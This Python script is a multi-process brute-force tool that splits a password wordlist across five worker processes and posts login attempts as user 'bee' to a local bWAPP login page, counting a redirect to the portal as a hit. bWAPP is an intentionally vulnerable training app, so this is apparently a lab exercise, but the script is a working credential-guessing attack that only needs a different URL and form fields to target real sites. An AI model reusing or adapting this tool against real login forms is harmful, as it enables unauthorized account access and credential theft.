import requests
import time
import threading
from collections import deque
import cursor
import sys
listItem=list()
from multiprocessing import Pool, Process ,Queue
printLock=threading.Lock()
counterVar=0
cursor.hide()


def readWordLists(wordListFile, n):
    wl=open(wordListFile,'r')
    wordLists=list()
    for x in range(n):
        wordLists.append(list())
    line=" "
    while(line!=""):
        for x in range(len(wordLists)):
            line= wl.readline()

            if(line!=""):
                temp = line[:-1]
                wordLists[x].append(temp)

            else:
                break
    return wordLists
class brute():
    def __init__(self, name,targetString,post_request_key_values,targetKey,wordListFile,goalUrls,printLock,q):
        self.name = name
        self.targetString=targetString
        self.post_request_key_values=post_request_key_values
        self.targetKey=targetKey
        self.wordListFile = wordListFile
        self.goalUrls=goalUrls
        self.printLock=printLock
        self.q=q

    def bruteAttack(self):
        global counterVar
        solutionSet=dict()
        for x in self.wordListFile:
            self.post_request_key_values[self.targetKey] = x
            r = requests.post(self.targetString, data = self.post_request_key_values)
            if not(r.url in solutionSet.keys()):
                b=list()
                b.append(x)
                solutionSet[r.url]=b
            else:
                solutionSet[r.url].append(x)

        if len(self.goalUrls)!=0:
            for x in self.goalUrls:
                if(x in solutionSet):
                    self.printLock.acquire()
                    print("\n")
                    self.q.put(self.name+str(solutionSet[x])+":"+str(x))
                    counterVar+=1
                    self.printLock.release()
                else:
                    printLock.acquire()
                    print("\n")
                    self.q.put(self.name+"No Solutions for:"+str(x))
                    counterVar+=1
                    printLock.release()

        else:
            self.printLock.acquire()
            print("\n")
            self.q.put(solutionSet)
            counter+=1
            self.printLock.release()

def launchBrutes(numberBrutes,q):
    wordLists=readWordLists('bWAPPWL',numberBrutes)
    processList=list()
    for x in range(numberBrutes):
        processList.append(Process(target=launchBrutesHelper,args=(wordLists[x],q)))
    for x in range(numberBrutes):
        processList[x].start()
    return processList
class loadBarThread (threading.Thread):
        def __init__(self,processList,stopFlag):
            threading.Thread.__init__(self)
            self.processList=processList
            self.stopFlag=stopFlag
        def run(self):
            loadingBar(self.processList,self.stopFlag)
def launchBrutesHelper(WL,q):
    global listItem

    brootie=brute("Brootie","http://localhost/bWAPP/login.php",{'login':'bee','form':'submit'},"password",WL,['http://localhost/bWAPP/portal.php'],printLock,q)
    brootie.bruteAttack()
def loadingBar(processList,stopFlag):
    def allDone(processList):

        for process in processList:
            if(process.is_alive()==True):
                return False
        return True

    while(allDone(processList)==False):

        printLock.acquire()
        print("\rLoading   ",end="")
        time.sleep(.5) #do some work here...
        print("\rLoading.", end="")
        time.sleep(.5) #do some more work here...
        print("\rLoading..", end="")
        time.sleep(.5) #do even more work...
        print("\rLoading...", end="")
        time.sleep(.5) #gratuitious amounts of work...
        print("\rLoading", end="")
        printLock.release()
        time.sleep(.5)
    stopFlag.set()



if __name__ == '__main__':
    stopFlag=threading.Event()
    q=Queue()
    listItem=launchBrutes(5,q)
    myloadBarThread=loadBarThread(listItem,stopFlag)
    myloadBarThread.start()
    stopFlag.wait()
    for x in listItem:
        b=x.join()
        print(b)
    while(q.empty()==False):
        print(q.get())
    print("Done")
